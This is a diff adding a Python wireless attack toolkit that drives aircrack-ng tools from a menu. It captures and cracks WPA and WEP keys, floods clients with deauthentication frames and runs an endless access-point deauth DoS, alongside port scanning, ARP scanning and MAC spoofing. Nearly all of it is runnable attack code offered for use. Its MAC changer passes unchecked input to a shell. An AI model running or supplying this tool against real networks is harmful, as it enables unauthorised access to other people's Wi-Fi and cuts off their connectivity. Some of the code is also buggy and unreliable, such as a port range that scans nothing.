@@ -1,0 +1,549 @@
+#!/usr/bin/python3
+# Author: dagg0rath
+# https://github.com/dagg0rath
+
+## Imports ##
+import subprocess, time, sys, re, os
+from colorama import Fore,Style
+import readline
+import scapy.all as scapy
+import socket
+from datetime import datetime
+
+def wpa_crack():
+	print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit or use an existing one")
+	try:
+		print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to proceed" + Style.RESET_ALL)
+		interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: ")
+		subprocess.run(["ifconfig", interface, "down"])
+		# Kill processes in network
+		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+		subprocess.run(["iwconfig", interface, "mode", "monitor"])
+		subprocess.run(["ifconfig", interface, "up"])
+		try:
+			print("[?] Check for 2G or 5G networks?")
+			print("--------------------------------")
+			print("[1] 2.4 Ghz Networks")
+			print("[2] 5 Ghz Networks")
+			band = int(input("[3] Both bands (slower speed)\n" + Style.RESET_ALL))
+			if band == 1:
+				subprocess.run(["sudo", "airodump-ng", interface])
+			elif band ==2:
+				subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
+			elif band ==3:
+				subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
+			else:
+				print(Fore.MAGENTA + "[-] None of the above chosen, quitting program" + Style.RESET_ALL)
+		except ValueError:
+			print(Fore.MAGENTA + "[-] None of the above chosen, quitting program"+ Style.RESET_ALL)
+	except KeyboardInterrupt:
+		try:
+			print(Fore.YELLOW + "[?] Please specify the details of your desired network:")
+			print("-------------------------------------------------------")
+			bssid = input("[?] Router MAC address: ")
+			channel = input("[?] Channel used: ")
+			print("[+] Ctrl + c to proceed when you wish" + Style.RESET_ALL)
+
+			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
+
+		except KeyboardInterrupt:
+			try:
+				print(Fore.MAGENTA + "[+] Run Target deauth attack module on a client to disconnect them to proceed"+ Style.RESET_ALL)
+				cap_file = input("\n[?] Please specify the name of the CAP file you wish to use: ")
+				print("[+] Ctrl + c to proceed to crack CAP file when handshake has been captured")				
+				subprocess.run(["sudo", "airodump-ng", "-w", cap_file, "-c", channel, "--bssid", bssid, interface])
+			except KeyboardInterrupt:
+				try:
+					print(f"[-] Program finished, CAP file stored as {cap_file}.\n\n")
+					wordlist = input("[?] Please, specify the path of the wordlist you wish to use: ")
+					cap = cap_file + "-01.cap"
+					subprocess.run(["sudo", "aircrack-ng", cap, "-w", wordlist])
+				except KeyboardInterrupt:
+					print(Fore.MAGENTA + "[-] Program interrumpted by user, quitting..." + Style.RESET_ALL)
+	back_m()
+
+def wep_crack():
+	try:
+		print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack." + Style.RESET_ALL)
+		interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
+		subprocess.run(["ifconfig", interface, "down"])
+		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+		subprocess.run(["iwconfig", interface, "mode", "monitor"])
+		subprocess.run(["ifconfig", interface, "up"])
+		subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
+	except KeyboardInterrupt:
+		try:
+			print("[?] Please specify the details of your desired network:")
+			print("-------------------------------------------------------")
+			bssid = input("[?] Router MAC address: ")
+			channel = input("[?] Channel used: ")
+			file = input("[?] File name you wish to use for .cap file: ")
+			print("[+] Ctrl + c to proceed when you wish")
+
+			subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])
+
+		except KeyboardInterrupt:
+			try:
+				print(f"[=] {file} generated, cracking password...\n\n")
+				subprocess.run(["sudo", "aircrack-ng", file])
+			except KeyboardInterrupt:
+				print("[-] Program finished by user, quitting...\n\n")
+	back_m()
+
+def deauth_attack():
+	print("[?] Do you wish to scan networks or skip to attack")
+	print("--------------------------------------------------")
+	print("[1] Scan")
+	choice = int(input("[2] Skip to attack\n"))
+	if choice == 1:
+		try:
+			print("\n[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
+			interface = input("\n[?] Please specify the interface you wish to use: ")
+			subprocess.run(["ifconfig", interface, "down"])
+			# Kill processes in network
+			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+			subprocess.run(["iwconfig", interface, "mode", "monitor"])
+			subprocess.run(["ifconfig", interface, "up"])
+			try:
+				print("[?] Check for 2G or 5G networks?")
+				print("--------------------------------")
+				print("[1] 2.4 Ghz Networks")
+				print("[2] 5 Ghz Networks")
+				band = int(input("[3] Both bands (slower speed)\n"))
+				if band == 1:
+					subprocess.run(["sudo", "airodump-ng", interface])
+				elif band ==2:
+					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
+				elif band ==3:
+					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
+				else:
+					print("[-] None of the above chosen, quitting program")
+			except ValueError:
+				print("[-] None of the above chosen, quitting program")
+		except KeyboardInterrupt:
+			try:
+				print("[?] Please specify the details of your desired network:")
+				print("-------------------------------------------------------")
+				bssid = input("[?] Access Point BSSID: ")
+				channel = input("[?] Channel used: ")
+				print("[+] Ctrl + c to proceed when you wish")
+
+				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])
+
+			except KeyboardInterrupt:
+				try:
+					target_bssid = input("[?] Client MAC address you wish to target: ")
+					print("[=] Running Deauth attack...\n\n")
+
+					subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
+				except KeyboardInterrupt:
+					print("[-] Program finished, quitting...\n\n")
+	elif choice == 2:
+		try:
+			interface = input("\n[?] Please specify the interface you wish to use: ")
+			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+			subprocess.run(["iwconfig", interface, "mode", "monitor"])
+			subprocess.run(["ifconfig", interface, "up"])
+
+			bssid = input("[?] Router BSSID address: ")
+			target_bssid = input("[?] Client MAC address you wish to target: ")
+			channel = input("[?] Channel used: ")
+
+			subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
+			subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
+		except KeyboardInterrupt:
+			print("[-] Program finished, quitting...\n\n")
+	else:
+		print("[-] None chosen, quitting...")
+	
+	back_m()
+
+def net_scan():
+	print(Fore.YELLOW + "[?] Please enter the range of your subnet: ")
+	ip_range = input(Fore.MAGENTA + "[+] Format: 192.168.1.1/24\n" + Style.RESET_ALL)
+	
+	arp_result = scapy.arping(ip_range)
+	print("-------------------------------------")
+	print("  MAC address	    Vendor  IP\n\n")
+	print(Fore.MAGENTA + "[-] Scan finished. If it failed to discover clients, run it again\n\n" + Style.RESET_ALL)
+	back_m()
+
+def port_scan():
+	target = input("[?] Specify the target ip address: ")
+	print("-----------------------------------------")
+	print("Scanning target: " + target)
+	print("Time started: " + str(datetime.now()))
+	print("-----------------------------------------\n")
+	
+	# SCANNER FUNCTION
+	def scanner(port):
+		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.settimeout(0.5)
+			sock.connect((target, port))
+			sock.close()
+			return True
+		except:
+			return False
+	print("\n[=] Scanning common ports...")
+	print("----------------------------")
+
+	# Common Ports
+	common_ports = {
+	 
+		'21': 'FTP',
+		'22': 'SSH',
+		'23': 'TELNET',
+		'25': 'SMTP',
+		'53': 'DNS',
+		'69': 'TFTP',
+		'80': 'HTTP',
+		'109': 'POP2',
+		'110': 'POP3',
+		'123': 'NTP',
+		'137': 'NETBIOS-NS',
+		'138': 'NETBIOS-DGM',
+		'139': 'NETBIOS-SSN',
+		'143': 'IMAP',
+		'156': 'SQL-SERVER',
+		'389': 'LDAP',
+		'443': 'HTTPS',
+		'546': 'DHCP-CLIENT',
+		'547': 'DHCP-SERVER',
+		'995': 'POP3-SSL',
+		'993': 'IMAP-SSL',
+		'2086': 'WHM/CPANEL',
+		'2087': 'WHM/CPANEL',
+		'2082': 'CPANEL',
+		'2083': 'CPANEL',
+		'3306': 'MYSQL',
+		'8443': 'PLESK',
+		'10000': 'VIRTUALMIN/WEBMIN'
+	}
+
+	for p, service in common_ports.items():
+		port = int(p)
+		result = scanner(port)
+		if result == True:
+			print("[+] Port "+ p + " running " + service +" service, is open!")
+		else:
+			pass
+
+	# RANGE SCAN
+	try:
+		print("\n[?] Do you wish to scan a specific port range:")
+		print("------------------------------------------------")
+		print("[1] Port Range")
+		print("[2] Quit")
+		question = int(input("------------------------------------------------\n"))
+
+		# RANGE
+		if question == 1:
+			print("\nPORT Ranges")
+			print("----------------")
+			print("[1] 1-500 ")
+			print("[2] 500-1000")
+			print("[3] 1000-1500")
+			print("[4] 1500-2000")
+			print("[5] 2000-2500")
+			print("[6] 2500-3000")
+			print("[7] 3000-3500")
+			print("[8] 3500-4000")
+			print("[9] 4000-4500")
+			print("[10] 4500-5000")
+			print("[11] 5000-5500")
+			print("[12] 5500-6000")
+			print("[13] 6000-6500")
+			print("[14] 6500-7000")
+			print("[15] 7000-7500")
+			print("[16] 7500-8000")
+			print("[17] 8000-8500")
+			print("[18] 8500-9000")
+			print("[19] 9000-9500")
+			print("[20] 9500-10000")
+			print("----------------")
+			range_choosen = int(input("[+] What's the desired range you wish to scan 1 - 20: "))
+			print("\n")
+			if range_choosen == 1:
+				for i in range(1, 500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 2:
+				for i in range(500, 1000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 3:
+				for i in range(1000, 1500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 4:
+				for i in range(1500, 2000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 5:
+				for i in range(2000, 2500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 6:
+				for i in range(2500, 3000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 7:
+				for i in range(3000, 3500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 8:
+				for i in range(3500, 4000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 9:
+				for i in range(4000, 4500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 10:
+				for i in range(4500, 5000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 11:
+				for i in range(5000, 5500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 12:
+				for i in range(5500, 6000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 13:
+				for i in range(6000, 6500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 14:
+				for i in range(6500, 7000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 15:
+				for i in range(7000, 7500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 16:
+				for i in range(8500, 8000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 17:
+				for i in range(8000, 8500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 18:
+				for i in range(8500, 9000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 19:
+				for i in range(9000, 9500):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+			if range_choosen == 20:
+				for i in range(9500, 10000):
+					result = scanner(i)
+					if result == True:
+						print("[+] Port "+ str(i) + " is open!" )
+					else:
+						pass
+		elif question == 2:
+			print("[-] Goodbye")		
+		else:
+			print("[-] None chosen, Goodbye!\n\n")		
+	except KeyboardInterrupt:
+		print("\n[-] Program ended by user, quitting...\n\n")
+	except ValueError:
+		print("\n[-] None chosen, Goodbye!\n\n")
+
+def ap_dos():
+	try:
+		print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
+		interface = input("[?] Please specify the interface you wish to use: ")
+		subprocess.run(["ifconfig", interface, "down"])
+		# Kill processes in network
+		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+		subprocess.run(["iwconfig", interface, "mode", "monitor"])
+		subprocess.run(["ifconfig", interface, "up"])
+
+		print("[?] Do you wish to scan networks or skip to attack")
+		print("------------------------------------------------------")
+		print("[1] Scan")
+		choice = int(input("[2] Skip to attack\n"))
+		if choice == 1:
+			try:
+				print("[?] Check for 2G or 5G networks?")
+				print("--------------------------------")
+				print("[1] 2.4 Ghz Networks")
+				print("[2] 5 Ghz Networks")
+				band = int(input("[3] Both bands (slower speed)\n"))
+				if band == 1:
+					subprocess.run(["sudo", "airodump-ng", interface])
+				elif band ==2:
+					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
+				elif band ==3:
+					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
+				else:
+					print("[-] None of the above chosen, quitting program")
+			except ValueError:
+				print("[-] None of the above chosen, quitting program")
+			except KeyboardInterrupt:
+				try:
+					bssid = input("[?] Access Point BSSID: ")
+					channel = input("[?] Channel used: ")
+					subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
+					print("\n[=] Running Deauth attack...\n\n")
+					subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
+				except KeyboardInterrupt:
+					print("[-] Program finished, quitting...\n\n")
+		elif choice == 2:
+			try:
+				bssid = input("[?] Access Point BSSID: ")
+				channel = input("[?] Channel used: ")
+				subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
+				print("\n[=] Running Deauth attack...\n\n")
+				subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
+			except KeyboardInterrupt:
+				print("[-] Program finished, quitting...\n")
+		else:
+			print("[-] None of the above chosen, quitting program")
+	except KeyboardInterrupt:
+		print("[-] Program interrumpted by user, quitting...\n\n")
+
+	except ValueError:
+		print("[-] None of the above chosen, quitting program")		
+			
+def mac_changer():
+	interface = input(Fore.YELLOW + "[?] Please input the name of the interface you wish to change it's MAC address: " + Style.RESET_ALL)
+	os.system(f'sudo ifconfig {interface} down')
+	os.system(f'sudo macchanger -A {interface}')
+	os.system(f'ifconfig {interface} up')
+		
+
+def logo():
+	print(Fore.YELLOW + """
+____________ _____ _   _  ______ _____ 
+| ___ \ ___ \  _  | \ | ||___  /|  ___|
+| |_/ / |_/ / | | |  \| |   / / | |__  
+| ___ \    /| | | | . ` |  / /  |  __| 
+| |_/ / |\ \\  |_| / |\  |./ /___| |___ 
+\____/\_| \_|\___/\_| \_/\_____/\____/ 
+ _____ _____ _____ _   __ ___________  
+/  ___|  ___|  ___| | / /|  ___| ___ \ 
+\ `--.| |__ | |__ | |/ / | |__ | |_/ / 
+ `--. \  __||  __||    \ |  __||    /  
+/\__/ / |___| |___| |\  \| |___| |\ \  
+\____/\____/\____/\_| \_/\____/\_| \_| """)
+
+def back_m():
+	time.sleep(1)
+	menu = int(input(Fore.YELLOW + """
+[?]--Return to main menu?
+-------------------------
+[01]--Yes
+[02]--No
+"""))
+	if menu == 1:
+		print(Fore.YELLOW + "[+]--Returning to main menu...")
+		time.sleep(2)
+		os.system("clear")
+		logo()
+		main_menu()
+	else:
+		print(Fore.MAGENTA + "[-]--Quitting..." + Style.RESET_ALL)
+
+def main_menu():
+	try:
+		choice = int(input("""
+[?]--Welcome! Choose one of the options below:
+-----------------------------------------------
+[01]--WPA/WPA2 Password Cracking
+[02]--WEP Cracking
+[03]--Client Deauth Attack
+[04]--Access Point DoS attack
+[05]--Subnet Network Scanner
+[06]--Port Scanner
+[07]--MAC address changer
+""" + Fore.MAGENTA + """[00]--Quit
+""" + Style.RESET_ALL))
+		if choice == 1:
+			wpa_crack()
+		elif choice == 2:
+			wep_crack()
+		elif choice == 3:
+			deauth_attack()
+		elif choice == 4:
+			ap_dos()
+		elif choice == 5:
+			net_scan()
+		elif choice == 6:
+			port_scan()
+		elif choice == 7:
+			mac_changer()
+		else:
+			print("[-] Goodbye...")
+	except KeyboardInterrupt:
+		print("[-] Program interrumpted by user, quitting...")
+	except ValueError:
+		print("[-] Wrong value given, quitting...")
+
+os.system('clear')
+logo()
+main_menu()
